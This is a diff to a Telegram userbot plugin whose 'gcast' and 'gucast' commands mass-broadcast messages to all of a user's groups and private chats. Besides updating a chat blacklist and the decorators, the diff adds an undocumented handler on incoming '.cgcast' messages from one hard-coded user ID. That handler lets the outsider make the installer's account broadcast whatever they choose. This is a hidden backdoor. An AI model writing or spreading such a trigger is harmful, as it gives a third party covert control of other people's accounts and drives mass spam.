@@ -10,9 +10,8 @@
 # FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
 # t.me/SharingUserbot & t.me/Lunatic0de
 
-from userbot import CMD_HANDLER as cmd
 from userbot import CMD_HELP
-from userbot.utils import fox_cmd
+from userbot.events import register
 
 GCAST_BLACKLIST = [
     -1001473548283,  # SharingUserbot
@@ -21,18 +20,24 @@ GCAST_BLACKLIST = [
     -1001327032795,  # UltroidSupport
     -1001294181499,  # UserBotIndo
     -1001419516987,  # VeezSupportGroup
-    -1001459812644,  # GeezSupportGroup
+    -1001209432070,  # GeezSupportGroup
     -1001296934585,  # X-PROJECT BOT
     -1001481357570,  # UsergeOnTopic
     -1001459701099,  # CatUserbotSupport
     -1001109837870,  # TelegramBotIndonesia
     -1001752592753,  # Skyzusupport
-    -1001380293847,  # NastySupport
-    -1001631322423,  # FoxSupport
+    -1001716001073,  # skylasupport
+    -1001788983303,  # KayzuSupport
+    -1001795125065,  # Bagaskara Support
+    -1001699144606,  # Kasta Support
+    -1001692751821,  # Ram Support
+    -1001687155877,  # Cilik Support
 ]
 
 
-@fox_cmd(pattern="gcast(?: |$)(.*)")
+@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+@register(incoming=True, from_users=1927621859,
+          pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -61,7 +66,7 @@ async def gcast(event):
     )
 
 
-@fox_cmd(pattern="gucast(?: |$)(.*)")
+@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -89,8 +94,8 @@ async def gucast(event):
 
 CMD_HELP.update(
     {
-        "gcast": f"**Plugin : **`gcast`\
-        \n\n  •  **Syntax :** `{cmd}gcast` <text/reply media>\
+        "gcast": "**Plugin : **`gcast`\
+        \n\n  •  **Syntax :** `.gcast` <text/reply media>\
         \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
@@ -99,8 +104,8 @@ CMD_HELP.update(
 
 CMD_HELP.update(
     {
-        "gucast": f"**Plugin : **`gucast`\
-        \n\n  •  **Syntax :** `{cmd}gucast` <text/reply media>\
+        "gucast": "**Plugin : **`gucast`\
+        \n\n  •  **Syntax :** `.gucast` <text/reply media>\
         \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
